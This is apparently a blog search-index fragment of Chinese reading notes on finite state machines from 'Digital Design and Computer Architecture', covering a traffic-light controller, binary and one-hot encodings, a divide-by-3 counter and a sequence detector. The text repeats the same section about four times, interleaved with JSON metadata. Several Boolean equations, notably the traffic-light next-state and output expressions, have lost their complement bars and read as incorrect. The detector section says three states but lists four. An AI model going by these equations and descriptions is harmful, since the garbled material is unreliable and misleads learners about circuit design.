状态转换输入：用$T_{A}$，$T_{B}$来表示，使用 X 来表示无关项（类似卡诺图） 状态转换表的每行有 3 项： 该状态 输入 下一状态 绘制状态转换表如下： 当前状态 输入$T_{A}$ 输入$T_{B}$ 下一状态 S0 0 X S1 S0 1 X S0 S1 X X S2 S2 X 0 S3 S2 X 1 S2 S3 X X S0 3.4.1.4 步骤四：对状态进行二进制编码状态分为：S0，S1，S2，S3 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 3.4.1.5 步骤五：对输出进行二进制编码输出分为：红、黄、绿 输出 $L_{1}$ $L_{0}$ 绿 0 0 黄 0 1 红 1 0 3.4.1.6 步骤六：确定状态与输入关系表（将状态编码嵌入到状态转换表） 当前状态 $S_{1}$ $S_{0}$ 输入$T_{A}$ 输入$T_{B}$ 下一状态 $S_{1}$ $S_{0}$ S0 0 0 0 X S1 0 1 S0 0 0 1 X S0 0 0 S1 0 1 X X S2 1 0 S2 1 0 X 0 S3 1 1 S2 1 0 X 1 S2 1 0 S3 1 1 X X S0 0 0 3.4.1.7 步骤七：确定状态与输出的关系表（根据电路分析、状态编码和输出编码） 状态 $S_{1}$ $S_{0}$ $L_{A1}$ $L_{A0}$ $L_{B1}$ $L_{B0}$ S0 0 0 0 0 1 0 S1 0 1 0 1 1 0 S2 1 0 1 0 0 0 S3 1 1 1 0 0 1 3.4.1.8 步骤八：写出状态表达式我们使用$S’$来表示下一时刻的状态，可以如下表示： $$ S_{1}’ = S_{1}S_{0} +S_{1}S_{0}T_{B} +S_{1}S_{0}T_{B} $$ $$ S_{0}’ = S_{1}S_{0}T_{A}+S_{1}S_{0}T_{B} $$ 3.4.1.9 步骤九：写出输出表达式$$ L_{A1} = S_{1}L_{A0} = S_{1}S_{0} $$ $$ L_{B1} = S_{1}L_{B0} = S_{1}S_{0} $$ 3.4.1.10 步骤十：画出电路图 设计寄存器 状态寄存器设计如图，左边是下一时刻状态，右边是之前的状态。在时钟上升沿，下一时刻状态打入寄存器，因此将其花在左边，而不是右边。 添加状态与输入关系电路 添加状态与输出关系电路 3.4.2 3.4.2 State Encodings 状态编码有分为二进制编码（binary encoding）和独热编码（One-hot encoding） 3.4.2.1 Binary EncodingN 个编码只需要$log_{2}N$位就可以表示。 3.4.2.2 One-hot EncodingN 个编码需要 N 位二进制表示，该二进制数中，对于一个状态有且仅有 1 位的值为 1。选择这种编码需要更多的触发器，但是对应的输出电路和状态转换电路会更简单。 3.4.2.3 设计示例1：3进制计数器设计一个 divide by 3 counter，当状态转换的次数为3的倍数时（对3求模 = 0），输出为1，否则输出为0 3.4.2.3.1 背景分析根据分析，电路存在3个状态： S0：初始状态，也是最终状态，输出为1。下一时刻跳转到S1 S1：输出为0，下一时刻跳转到S2 S2：输出为0，下一时刻跳转到S0 电路状态转换图如下： 3.4.2.3.2 状态转换图绘制 状态有3个，S0、S1和S2，我们分别采用二进制编码和独热编码对其进行编码。 3.4.2.3.3 采用二进制编码设计 状态编码：电路有3个状态，我们采用2位二进制进行编码，分别用$S_{1}$和$S_{0}$表示。 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 输出编码：电路只有1个输出，也就是Y，那么我们只需要1位二进制数表示 状态转换表 状态 $S_{1}$ $S_{0}$ 下一状态 $S_{1}'$ $S_{0}'$ S0 0 0 S1 0 1 S1 0 1 S2 1 0 S2 1 0 S0 0 0 由图我们可以得到状态表达式，下一时刻的状态用$S’$表示。 $$ S_{1}’ = \\bar{S_{1}}S_{0} $$ $$ S_{0}’ = \\bar{S_{1}}\\bar{S_{0}} $$ 状态与输出关系表 状态 $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 S1 0 1 0 S2 1 0 0 由图我们可以得到输出与状态的关系式： $$ Y=\\bar{S_{1}}\\bar{S_{0}} $$ 电路图设计 3.4.2.3.4 采用独热编码设计 状态编码：独热编码对每个状态使用1位单独的二进制1，因此3个状态需要3位二进制数。 状态 $S_{2}$ $S_{1}$ $S_{0}$ S0 0 0 1 S1 0 1 0 S2 1 0 0 输出编码：电路只有1个输出，也就是Y，使用1位二进制数表示 状态转换表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 下一时刻状态 $S_{2}'$ $S_{1}'$ $S_{0}'$ S0 0 0 1 S1 0 1 0 S1 0 1 0 S2 1 0 0 S2 1 0 0 S0 0 0 1 由图我们可以得到状态表达式： $$ S_{1}’ = S{0} $$ $$ S_{2}’ = S{1} $$ $$ S_{0}’ = S{2} $$ 状态与输出关系表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 1 S1 0 1 0 0 S2 1 0 0 0 由此我们可以得到状态与输出表达式：$Y=S_{0}$ 电路设计 通过上面的分析，我们可以看到，独热编码的逻辑表达式比二进制编码要简单很多，但是会更加消耗二进制位数。电路设计如下： 3.4.2.4 设计示例2：3进制累加器设计一个累加器，当连续输入3个1时，输出为1，其他时候输出为0。 3.4.2.4.1 背景分析根据分析，电路存在3个状态： S0：起始（复位）状态，输入0个3时，输出为0。若此时输入1，进入S1；否则继续S0 S1：输入1个3时，输出为0。若此时输入1，进入S2；否则进入S0 S2：输入2个3时，输出为0。若此时输入1，进入S3；否则进入S0 S3：输入3个3时，输出为1。下一状态为S0 3.4.2.4.2 状态转换图绘制 3.4.2.4.3 状态转换表绘制 状态 $S_{1}$ $S_{0}$ 输入T 下一时刻状态 $S_{1}'$ $S_{0}'$ 输出 S0 0 0 0 S0 0 0 0 S0 0 0 1 S1 0 1 0 S1 0 1 0 S0 0 0 0 S1 0 1 1 S2 1 0 0 S2 1 0 0 S0 0 0 0 S2 1 0 1 S3 1 1 0 S3 1 1 X S0 0 0 1 3.4.2.4.4 二进制编码实现 状态编码：状态有4个，因此使用2位二进制数进行编码 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 输入编码：输入只有1个，因此","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:4","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#采用独热编码设计"},{"categories":["计算机体系结构"],"content":" 3.4 3.4 Finite State Machines时序逻辑电路可以被表示成有限状态机的形式，它通常有如下几个组成部分： M 个输入 N 个输出 k 位的状态（因此电路一共可以有$2^{k}$个状态） 一个时钟 时序逻辑电路又分两种： Moore 型电路：电路的状态由电路之前的状态和组合逻辑函数决定 Mealy 型电路：电路的状态由之前的状态，电路的输入，和组合逻辑函数决定 3.4.1 3.4.1 FSM Design Example 下面通过一个设计十字路口交通灯的案例，来演示时序逻辑电路的设计。 3.4.1.1 步骤一：明确问题背景 十字路口有两个传感器：$T_{A}$和$T_{B}$，当传感器输出为True代表有学生，输出为False代表道路空 两个交通灯：$L_{A}$和$L_{B}$，每个交通灯都要接受传感器的数据，然后决定是输出红，绿，还是黄 每个交通灯有 5 秒的间隔，交通灯在时钟上升沿通过传感器的输入，更新自己的状态 控制器还有一个 reset 按钮来实现复位 交通灯概念图设计如下： 交通灯接口设计如下： 3.4.1.2 步骤二：绘制状态转换图电路状态转换过程分析如下： 状态的初始值（复位状态）如下：A 路绿，B 路红 如果$T_{A}$为True，那么 A 路持续绿，B 路持续红；否则，A 路进入黄色，B 路红 A 路黄，B 路红时，我们无需管$T_{A}$的状态。过 5 秒自动切入下一个状态：A 路红，B 路绿 A 路红，B 路绿时，如果$T_{B}$为True，那么 A 路持续红，B 路持续绿；否则，A 路红，B 路进入黄色 A 路红，B 路进入黄色时，我们无需管$T_{B}$的状态，过 5 秒后回到初始状态，A 路绿，B 路红 根据以上分析，电路可以划分为以下几个状态： A 路绿，B 路红：$T_{A}$为True时保持，否则进入状态 2 A 路黄，B 路红：5 秒后进入状态 3 A 路红，B 路绿：$T_{B}$为True时保持，否则进入状态 4 A 路红，B 路黄：5 秒后进入状态 1 电路转换的时机是时钟上升沿 3.4.1.3 步骤三：绘制状态转换表我们将状态转换图，转化为状态转换表。在绘制过程中，我们需要明确如下几样： 状态表示：这里我们用 S0，S1，S2，S3 来表示 状态转换输入：用$T_{A}$，$T_{B}$来表示，使用 X 来表示无关项（类似卡诺图） 状态转换表的每行有 3 项： 该状态 输入 下一状态 绘制状态转换表如下： 当前状态 输入$T_{A}$ 输入$T_{B}$ 下一状态 S0 0 X S1 S0 1 X S0 S1 X X S2 S2 X 0 S3 S2 X 1 S2 S3 X X S0 3.4.1.4 步骤四：对状态进行二进制编码状态分为：S0，S1，S2，S3 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 3.4.1.5 步骤五：对输出进行二进制编码输出分为：红、黄、绿 输出 $L_{1}$ $L_{0}$ 绿 0 0 黄 0 1 红 1 0 3.4.1.6 步骤六：确定状态与输入关系表（将状态编码嵌入到状态转换表） 当前状态 $S_{1}$ $S_{0}$ 输入$T_{A}$ 输入$T_{B}$ 下一状态 $S_{1}$ $S_{0}$ S0 0 0 0 X S1 0 1 S0 0 0 1 X S0 0 0 S1 0 1 X X S2 1 0 S2 1 0 X 0 S3 1 1 S2 1 0 X 1 S2 1 0 S3 1 1 X X S0 0 0 3.4.1.7 步骤七：确定状态与输出的关系表（根据电路分析、状态编码和输出编码） 状态 $S_{1}$ $S_{0}$ $L_{A1}$ $L_{A0}$ $L_{B1}$ $L_{B0}$ S0 0 0 0 0 1 0 S1 0 1 0 1 1 0 S2 1 0 1 0 0 0 S3 1 1 1 0 0 1 3.4.1.8 步骤八：写出状态表达式我们使用$S’$来表示下一时刻的状态，可以如下表示： $$ S_{1}’ = S_{1}S_{0} +S_{1}S_{0}T_{B} +S_{1}S_{0}T_{B} $$ $$ S_{0}’ = S_{1}S_{0}T_{A}+S_{1}S_{0}T_{B} $$ 3.4.1.9 步骤九：写出输出表达式$$ L_{A1} = S_{1}L_{A0} = S_{1}S_{0} $$ $$ L_{B1} = S_{1}L_{B0} = S_{1}S_{0} $$ 3.4.1.10 步骤十：画出电路图 设计寄存器 状态寄存器设计如图，左边是下一时刻状态，右边是之前的状态。在时钟上升沿，下一时刻状态打入寄存器，因此将其花在左边，而不是右边。 添加状态与输入关系电路 添加状态与输出关系电路 3.4.2 3.4.2 State Encodings 状态编码有分为二进制编码（binary encoding）和独热编码（One-hot encoding） 3.4.2.1 Binary EncodingN 个编码只需要$log_{2}N$位就可以表示。 3.4.2.2 One-hot EncodingN 个编码需要 N 位二进制表示，该二进制数中，对于一个状态有且仅有 1 位的值为 1。选择这种编码需要更多的触发器，但是对应的输出电路和状态转换电路会更简单。 3.4.2.3 设计示例1：3进制计数器设计一个 divide by 3 counter，当状态转换的次数为3的倍数时（对3求模 = 0），输出为1，否则输出为0 3.4.2.3.1 背景分析根据分析，电路存在3个状态： S0：初始状态，也是最终状态，输出为1。下一时刻跳转到S1 S1：输出为0，下一时刻跳转到S2 S2：输出为0，下一时刻跳转到S0 电路状态转换图如下： 3.4.2.3.2 状态转换图绘制 状态有3个，S0、S1和S2，我们分别采用二进制编码和独热编码对其进行编码。 3.4.2.3.3 采用二进制编码设计 状态编码：电路有3个状态，我们采用2位二进制进行编码，分别用$S_{1}$和$S_{0}$表示。 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 输出编码：电路只有1个输出，也就是Y，那么我们只需要1位二进制数表示 状态转换表 状态 $S_{1}$ $S_{0}$ 下一状态 $S_{1}'$ $S_{0}'$ S0 0 0 S1 0 1 S1 0 1 S2 1 0 S2 1 0 S0 0 0 由图我们可以得到状态表达式，下一时刻的状态用$S’$表示。 $$ S_{1}’ = \\bar{S_{1}}S_{0} $$ $$ S_{0}’ = \\bar{S_{1}}\\bar{S_{0}} $$ 状态与输出关系表 状态 $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 S1 0 1 0 S2 1 0 0 由图我们可以得到输出与状态的关系式： $$ Y=\\bar{S_{1}}\\bar{S_{0}} $$ 电路图设计 3.4.2.3.4 采用独热编码设计 状态编码：独热编码对每个状态使用1位单独的二进制1，因此3个状态需要3位二进制数。 状态 $S_{2}$ $S_{1}$ $S_{0}$ S0 0 0 1 S1 0 1 0 S2 1 0 0 输出编码：电路只有1个输出，也就是Y，使用1位二进制数表示 状态转换表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 下一时刻状态 $S_{2}'$ $S_{1}'$ $S_{0}'$ S0 0 0 1 S1 0 1 0 S1 0 1 0 S2 1 0 0 S2 1 0 0 S0 0 0 1 由图我们可以得到状态表达式： $$ S_{1}’ = S{0} $$ $$ S_{2}’ = S{1} $$ $$ S_{0}’ = S{2} $$ 状态与输出关系表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 1 S1 0 1 0 0 S2 1 0 0 0 由此我们可以得到状态与输出表达式：$Y=S_{0}$ 电路设计 通过上面的分析，我们可以看到，独热编码的逻辑表达式比二进制编码要简单很多，但是会更加消耗二进制位数。电路设计如下： 3.4.2.4 设计示例2：3进制累加器设计一个累加器，当连续输入3个1时，输出为1，其他时候输出为0。 3.4.2.4.1 背景分析根据分析，电路存在3个状态： S0：起始（复位）状态，输入0个3时，输出为0。若此时输入1，进入S1；否则继续S0 S1：输入1个3时，输出为0。若此时输入1，进入S2；否则进入S0 S2：输入2个3时，输出为0。若此时输入1，进入S3；否则进入S0 S3：输入3个3时，输出为1。下一状态为S0 3.4.2.4.2 状态转换图绘制 3.4.2.4.3 状态转换表绘制 状态 $S_{1}$ $S_{0}$ 输入T 下一时刻状态 $S_{1}'$ $S_{0}'$ 输出 S0 0 0 0 S0 0 0 0 S0 0 0 1 S1 0 1 0 S1 0 1 0 S0 0 0 0 S1 0 1 1 S2 1 0 0 S2 1 0 0 S0 0 0 0 S2 1 0 1 S3 1 1 0 S3 1 1 X S0 0 0 1 3.4.2.4.4 二进制编码实现 状态编码：状态有4个，因此使用2位二进制数进行编码 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 输入编码：输入只有1个，因此","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:4","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#设计示例23进制累加器"},{"categories":["计算机体系结构"],"content":" 3.4 3.4 Finite State Machines时序逻辑电路可以被表示成有限状态机的形式，它通常有如下几个组成部分： M 个输入 N 个输出 k 位的状态（因此电路一共可以有$2^{k}$个状态） 一个时钟 时序逻辑电路又分两种： Moore 型电路：电路的状态由电路之前的状态和组合逻辑函数决定 Mealy 型电路：电路的状态由之前的状态，电路的输入，和组合逻辑函数决定 3.4.1 3.4.1 FSM Design Example 下面通过一个设计十字路口交通灯的案例，来演示时序逻辑电路的设计。 3.4.1.1 步骤一：明确问题背景 十字路口有两个传感器：$T_{A}$和$T_{B}$，当传感器输出为True代表有学生，输出为False代表道路空 两个交通灯：$L_{A}$和$L_{B}$，每个交通灯都要接受传感器的数据，然后决定是输出红，绿，还是黄 每个交通灯有 5 秒的间隔，交通灯在时钟上升沿通过传感器的输入，更新自己的状态 控制器还有一个 reset 按钮来实现复位 交通灯概念图设计如下： 交通灯接口设计如下： 3.4.1.2 步骤二：绘制状态转换图电路状态转换过程分析如下： 状态的初始值（复位状态）如下：A 路绿，B 路红 如果$T_{A}$为True，那么 A 路持续绿，B 路持续红；否则，A 路进入黄色，B 路红 A 路黄，B 路红时，我们无需管$T_{A}$的状态。过 5 秒自动切入下一个状态：A 路红，B 路绿 A 路红，B 路绿时，如果$T_{B}$为True，那么 A 路持续红，B 路持续绿；否则，A 路红，B 路进入黄色 A 路红，B 路进入黄色时，我们无需管$T_{B}$的状态，过 5 秒后回到初始状态，A 路绿，B 路红 根据以上分析，电路可以划分为以下几个状态： A 路绿，B 路红：$T_{A}$为True时保持，否则进入状态 2 A 路黄，B 路红：5 秒后进入状态 3 A 路红，B 路绿：$T_{B}$为True时保持，否则进入状态 4 A 路红，B 路黄：5 秒后进入状态 1 电路转换的时机是时钟上升沿 3.4.1.3 步骤三：绘制状态转换表我们将状态转换图，转化为状态转换表。在绘制过程中，我们需要明确如下几样： 状态表示：这里我们用 S0，S1，S2，S3 来表示 状态转换输入：用$T_{A}$，$T_{B}$来表示，使用 X 来表示无关项（类似卡诺图） 状态转换表的每行有 3 项： 该状态 输入 下一状态 绘制状态转换表如下： 当前状态 输入$T_{A}$ 输入$T_{B}$ 下一状态 S0 0 X S1 S0 1 X S0 S1 X X S2 S2 X 0 S3 S2 X 1 S2 S3 X X S0 3.4.1.4 步骤四：对状态进行二进制编码状态分为：S0，S1，S2，S3 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 3.4.1.5 步骤五：对输出进行二进制编码输出分为：红、黄、绿 输出 $L_{1}$ $L_{0}$ 绿 0 0 黄 0 1 红 1 0 3.4.1.6 步骤六：确定状态与输入关系表（将状态编码嵌入到状态转换表） 当前状态 $S_{1}$ $S_{0}$ 输入$T_{A}$ 输入$T_{B}$ 下一状态 $S_{1}$ $S_{0}$ S0 0 0 0 X S1 0 1 S0 0 0 1 X S0 0 0 S1 0 1 X X S2 1 0 S2 1 0 X 0 S3 1 1 S2 1 0 X 1 S2 1 0 S3 1 1 X X S0 0 0 3.4.1.7 步骤七：确定状态与输出的关系表（根据电路分析、状态编码和输出编码） 状态 $S_{1}$ $S_{0}$ $L_{A1}$ $L_{A0}$ $L_{B1}$ $L_{B0}$ S0 0 0 0 0 1 0 S1 0 1 0 1 1 0 S2 1 0 1 0 0 0 S3 1 1 1 0 0 1 3.4.1.8 步骤八：写出状态表达式我们使用$S’$来表示下一时刻的状态，可以如下表示： $$ S_{1}’ = S_{1}S_{0} +S_{1}S_{0}T_{B} +S_{1}S_{0}T_{B} $$ $$ S_{0}’ = S_{1}S_{0}T_{A}+S_{1}S_{0}T_{B} $$ 3.4.1.9 步骤九：写出输出表达式$$ L_{A1} = S_{1}L_{A0} = S_{1}S_{0} $$ $$ L_{B1} = S_{1}L_{B0} = S_{1}S_{0} $$ 3.4.1.10 步骤十：画出电路图 设计寄存器 状态寄存器设计如图，左边是下一时刻状态，右边是之前的状态。在时钟上升沿，下一时刻状态打入寄存器，因此将其花在左边，而不是右边。 添加状态与输入关系电路 添加状态与输出关系电路 3.4.2 3.4.2 State Encodings 状态编码有分为二进制编码（binary encoding）和独热编码（One-hot encoding） 3.4.2.1 Binary EncodingN 个编码只需要$log_{2}N$位就可以表示。 3.4.2.2 One-hot EncodingN 个编码需要 N 位二进制表示，该二进制数中，对于一个状态有且仅有 1 位的值为 1。选择这种编码需要更多的触发器，但是对应的输出电路和状态转换电路会更简单。 3.4.2.3 设计示例1：3进制计数器设计一个 divide by 3 counter，当状态转换的次数为3的倍数时（对3求模 = 0），输出为1，否则输出为0 3.4.2.3.1 背景分析根据分析，电路存在3个状态： S0：初始状态，也是最终状态，输出为1。下一时刻跳转到S1 S1：输出为0，下一时刻跳转到S2 S2：输出为0，下一时刻跳转到S0 电路状态转换图如下： 3.4.2.3.2 状态转换图绘制 状态有3个，S0、S1和S2，我们分别采用二进制编码和独热编码对其进行编码。 3.4.2.3.3 采用二进制编码设计 状态编码：电路有3个状态，我们采用2位二进制进行编码，分别用$S_{1}$和$S_{0}$表示。 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 输出编码：电路只有1个输出，也就是Y，那么我们只需要1位二进制数表示 状态转换表 状态 $S_{1}$ $S_{0}$ 下一状态 $S_{1}'$ $S_{0}'$ S0 0 0 S1 0 1 S1 0 1 S2 1 0 S2 1 0 S0 0 0 由图我们可以得到状态表达式，下一时刻的状态用$S’$表示。 $$ S_{1}’ = \\bar{S_{1}}S_{0} $$ $$ S_{0}’ = \\bar{S_{1}}\\bar{S_{0}} $$ 状态与输出关系表 状态 $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 S1 0 1 0 S2 1 0 0 由图我们可以得到输出与状态的关系式： $$ Y=\\bar{S_{1}}\\bar{S_{0}} $$ 电路图设计 3.4.2.3.4 采用独热编码设计 状态编码：独热编码对每个状态使用1位单独的二进制1，因此3个状态需要3位二进制数。 状态 $S_{2}$ $S_{1}$ $S_{0}$ S0 0 0 1 S1 0 1 0 S2 1 0 0 输出编码：电路只有1个输出，也就是Y，使用1位二进制数表示 状态转换表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 下一时刻状态 $S_{2}'$ $S_{1}'$ $S_{0}'$ S0 0 0 1 S1 0 1 0 S1 0 1 0 S2 1 0 0 S2 1 0 0 S0 0 0 1 由图我们可以得到状态表达式： $$ S_{1}’ = S{0} $$ $$ S_{2}’ = S{1} $$ $$ S_{0}’ = S{2} $$ 状态与输出关系表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 1 S1 0 1 0 0 S2 1 0 0 0 由此我们可以得到状态与输出表达式：$Y=S_{0}$ 电路设计 通过上面的分析，我们可以看到，独热编码的逻辑表达式比二进制编码要简单很多，但是会更加消耗二进制位数。电路设计如下： 3.4.2.4 设计示例2：3进制累加器设计一个累加器，当连续输入3个1时，输出为1，其他时候输出为0。 3.4.2.4.1 背景分析根据分析，电路存在3个状态： S0：起始（复位）状态，输入0个3时，输出为0。若此时输入1，进入S1；否则继续S0 S1：输入1个3时，输出为0。若此时输入1，进入S2；否则进入S0 S2：输入2个3时，输出为0。若此时输入1，进入S3；否则进入S0 S3：输入3个3时，输出为1。下一状态为S0 3.4.2.4.2 状态转换图绘制 3.4.2.4.3 状态转换表绘制 状态 $S_{1}$ $S_{0}$ 输入T 下一时刻状态 $S_{1}'$ $S_{0}'$ 输出 S0 0 0 0 S0 0 0 0 S0 0 0 1 S1 0 1 0 S1 0 1 0 S0 0 0 0 S1 0 1 1 S2 1 0 0 S2 1 0 0 S0 0 0 0 S2 1 0 1 S3 1 1 0 S3 1 1 X S0 0 0 1 3.4.2.4.4 二进制编码实现 状态编码：状态有4个，因此使用2位二进制数进行编码 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 输入编码：输入只有1个，因此","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:4","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#背景分析-1"},{"categories":["计算机体系结构"],"content":" 3.4 3.4 Finite State Machines时序逻辑电路可以被表示成有限状态机的形式，它通常有如下几个组成部分： M 个输入 N 个输出 k 位的状态（因此电路一共可以有$2^{k}$个状态） 一个时钟 时序逻辑电路又分两种： Moore 型电路：电路的状态由电路之前的状态和组合逻辑函数决定 Mealy 型电路：电路的状态由之前的状态，电路的输入，和组合逻辑函数决定 3.4.1 3.4.1 FSM Design Example 下面通过一个设计十字路口交通灯的案例，来演示时序逻辑电路的设计。 3.4.1.1 步骤一：明确问题背景 十字路口有两个传感器：$T_{A}$和$T_{B}$，当传感器输出为True代表有学生，输出为False代表道路空 两个交通灯：$L_{A}$和$L_{B}$，每个交通灯都要接受传感器的数据，然后决定是输出红，绿，还是黄 每个交通灯有 5 秒的间隔，交通灯在时钟上升沿通过传感器的输入，更新自己的状态 控制器还有一个 reset 按钮来实现复位 交通灯概念图设计如下： 交通灯接口设计如下： 3.4.1.2 步骤二：绘制状态转换图电路状态转换过程分析如下： 状态的初始值（复位状态）如下：A 路绿，B 路红 如果$T_{A}$为True，那么 A 路持续绿，B 路持续红；否则，A 路进入黄色，B 路红 A 路黄，B 路红时，我们无需管$T_{A}$的状态。过 5 秒自动切入下一个状态：A 路红，B 路绿 A 路红，B 路绿时，如果$T_{B}$为True，那么 A 路持续红，B 路持续绿；否则，A 路红，B 路进入黄色 A 路红，B 路进入黄色时，我们无需管$T_{B}$的状态，过 5 秒后回到初始状态，A 路绿，B 路红 根据以上分析，电路可以划分为以下几个状态： A 路绿，B 路红：$T_{A}$为True时保持，否则进入状态 2 A 路黄，B 路红：5 秒后进入状态 3 A 路红，B 路绿：$T_{B}$为True时保持，否则进入状态 4 A 路红，B 路黄：5 秒后进入状态 1 电路转换的时机是时钟上升沿 3.4.1.3 步骤三：绘制状态转换表我们将状态转换图，转化为状态转换表。在绘制过程中，我们需要明确如下几样： 状态表示：这里我们用 S0，S1，S2，S3 来表示 状态转换输入：用$T_{A}$，$T_{B}$来表示，使用 X 来表示无关项（类似卡诺图） 状态转换表的每行有 3 项： 该状态 输入 下一状态 绘制状态转换表如下： 当前状态 输入$T_{A}$ 输入$T_{B}$ 下一状态 S0 0 X S1 S0 1 X S0 S1 X X S2 S2 X 0 S3 S2 X 1 S2 S3 X X S0 3.4.1.4 步骤四：对状态进行二进制编码状态分为：S0，S1，S2，S3 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 3.4.1.5 步骤五：对输出进行二进制编码输出分为：红、黄、绿 输出 $L_{1}$ $L_{0}$ 绿 0 0 黄 0 1 红 1 0 3.4.1.6 步骤六：确定状态与输入关系表（将状态编码嵌入到状态转换表） 当前状态 $S_{1}$ $S_{0}$ 输入$T_{A}$ 输入$T_{B}$ 下一状态 $S_{1}$ $S_{0}$ S0 0 0 0 X S1 0 1 S0 0 0 1 X S0 0 0 S1 0 1 X X S2 1 0 S2 1 0 X 0 S3 1 1 S2 1 0 X 1 S2 1 0 S3 1 1 X X S0 0 0 3.4.1.7 步骤七：确定状态与输出的关系表（根据电路分析、状态编码和输出编码） 状态 $S_{1}$ $S_{0}$ $L_{A1}$ $L_{A0}$ $L_{B1}$ $L_{B0}$ S0 0 0 0 0 1 0 S1 0 1 0 1 1 0 S2 1 0 1 0 0 0 S3 1 1 1 0 0 1 3.4.1.8 步骤八：写出状态表达式我们使用$S’$来表示下一时刻的状态，可以如下表示： $$ S_{1}’ = S_{1}S_{0} +S_{1}S_{0}T_{B} +S_{1}S_{0}T_{B} $$ $$ S_{0}’ = S_{1}S_{0}T_{A}+S_{1}S_{0}T_{B} $$ 3.4.1.9 步骤九：写出输出表达式$$ L_{A1} = S_{1}L_{A0} = S_{1}S_{0} $$ $$ L_{B1} = S_{1}L_{B0} = S_{1}S_{0} $$ 3.4.1.10 步骤十：画出电路图 设计寄存器 状态寄存器设计如图，左边是下一时刻状态，右边是之前的状态。在时钟上升沿，下一时刻状态打入寄存器，因此将其花在左边，而不是右边。 添加状态与输入关系电路 添加状态与输出关系电路 3.4.2 3.4.2 State Encodings 状态编码有分为二进制编码（binary encoding）和独热编码（One-hot encoding） 3.4.2.1 Binary EncodingN 个编码只需要$log_{2}N$位就可以表示。 3.4.2.2 One-hot EncodingN 个编码需要 N 位二进制表示，该二进制数中，对于一个状态有且仅有 1 位的值为 1。选择这种编码需要更多的触发器，但是对应的输出电路和状态转换电路会更简单。 3.4.2.3 设计示例1：3进制计数器设计一个 divide by 3 counter，当状态转换的次数为3的倍数时（对3求模 = 0），输出为1，否则输出为0 3.4.2.3.1 背景分析根据分析，电路存在3个状态： S0：初始状态，也是最终状态，输出为1。下一时刻跳转到S1 S1：输出为0，下一时刻跳转到S2 S2：输出为0，下一时刻跳转到S0 电路状态转换图如下： 3.4.2.3.2 状态转换图绘制 状态有3个，S0、S1和S2，我们分别采用二进制编码和独热编码对其进行编码。 3.4.2.3.3 采用二进制编码设计 状态编码：电路有3个状态，我们采用2位二进制进行编码，分别用$S_{1}$和$S_{0}$表示。 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 输出编码：电路只有1个输出，也就是Y，那么我们只需要1位二进制数表示 状态转换表 状态 $S_{1}$ $S_{0}$ 下一状态 $S_{1}'$ $S_{0}'$ S0 0 0 S1 0 1 S1 0 1 S2 1 0 S2 1 0 S0 0 0 由图我们可以得到状态表达式，下一时刻的状态用$S’$表示。 $$ S_{1}’ = \\bar{S_{1}}S_{0} $$ $$ S_{0}’ = \\bar{S_{1}}\\bar{S_{0}} $$ 状态与输出关系表 状态 $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 S1 0 1 0 S2 1 0 0 由图我们可以得到输出与状态的关系式： $$ Y=\\bar{S_{1}}\\bar{S_{0}} $$ 电路图设计 3.4.2.3.4 采用独热编码设计 状态编码：独热编码对每个状态使用1位单独的二进制1，因此3个状态需要3位二进制数。 状态 $S_{2}$ $S_{1}$ $S_{0}$ S0 0 0 1 S1 0 1 0 S2 1 0 0 输出编码：电路只有1个输出，也就是Y，使用1位二进制数表示 状态转换表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 下一时刻状态 $S_{2}'$ $S_{1}'$ $S_{0}'$ S0 0 0 1 S1 0 1 0 S1 0 1 0 S2 1 0 0 S2 1 0 0 S0 0 0 1 由图我们可以得到状态表达式： $$ S_{1}’ = S{0} $$ $$ S_{2}’ = S{1} $$ $$ S_{0}’ = S{2} $$ 状态与输出关系表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 1 S1 0 1 0 0 S2 1 0 0 0 由此我们可以得到状态与输出表达式：$Y=S_{0}$ 电路设计 通过上面的分析，我们可以看到，独热编码的逻辑表达式比二进制编码要简单很多，但是会更加消耗二进制位数。电路设计如下： 3.4.2.4 设计示例2：3进制累加器设计一个累加器，当连续输入3个1时，输出为1，其他时候输出为0。 3.4.2.4.1 背景分析根据分析，电路存在3个状态： 